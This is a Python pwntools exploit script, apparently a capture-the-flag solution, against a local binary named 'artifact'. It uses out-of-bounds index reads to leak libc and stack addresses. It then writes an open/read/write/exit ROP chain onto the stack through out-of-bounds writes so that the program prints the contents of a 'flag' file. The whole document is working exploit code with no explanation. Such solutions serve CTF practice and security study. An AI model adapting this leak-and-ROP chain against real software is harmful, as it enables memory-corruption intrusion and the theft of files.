from pwn import *

p = process('./artifact')
elf = ELF('./artifact')
libc = elf.libc

def show(index):
    p.sendlineafter('Choice?', '1')
    p.sendlineafter('Idx?', str(index))

def memo(index, num):
    p.sendlineafter('Choice?', '2')
    p.sendlineafter('Idx?', str(index))
    p.sendlineafter('number:', str(num))

# leak libc
show(203)
p.recvuntil('Here it is: ')
__libc_start_main = int(p.recvline().strip())-243
libc_base = __libc_start_main - libc.sym['__libc_start_main']
success('libc base = 0x%x', libc_base)

# leak stack
show(200)
p.recvuntil('Here it is: ')
stack = int(p.recvline().strip())-0x740
success("stack = 0x%x", stack)

pop_rdi = 0x26b72 + libc_base
pop_rsi = 0x27529 + libc_base
pop_rdx_rbx = 0x1626d6 + libc_base
pop_rax = 0x4a550 + libc_base
syscall = 0x66229 + libc_base        # should use --multibr in ROPdagdet to find syscall ; ret

# write flag on stack
memo(0, u64('flag'.ljust(8, '\x00')))

retIndex = 203
# open
memo(retIndex, pop_rdi)
memo(retIndex+1, stack)
memo(retIndex+2, pop_rsi)
memo(retIndex+3, 0)
memo(retIndex+4, pop_rdx_rbx)
memo(retIndex+5, 2)
memo(retIndex+6, 0)
memo(retIndex+7, pop_rax)
memo(retIndex+8, 2)
memo(retIndex+9, syscall)

# read
memo(retIndex+10, pop_rdi)
memo(retIndex+11, 3)
memo(retIndex+12, pop_rsi)
memo(retIndex+13, stack+8)
memo(retIndex+14, pop_rdx_rbx)
memo(retIndex+15, 0x30)
memo(retIndex+16, 0)
memo(retIndex+17, pop_rax)
memo(retIndex+18, 0)
memo(retIndex+19, syscall)

# write
memo(retIndex+20, pop_rdi)
memo(retIndex+21, 1)
memo(retIndex+22, pop_rsi)
memo(retIndex+23, stack+8)
memo(retIndex+24, pop_rdx_rbx)
memo(retIndex+25, 0x30)
memo(retIndex+26, 0)
memo(retIndex+27, pop_rax)
memo(retIndex+28, 1)
memo(retIndex+29, syscall)

# exit
memo(retIndex+30, pop_rax)
memo(retIndex+31, 60)
memo(retIndex+32, syscall)

p.sendlineafter('Choice?', '3')

p.interactive()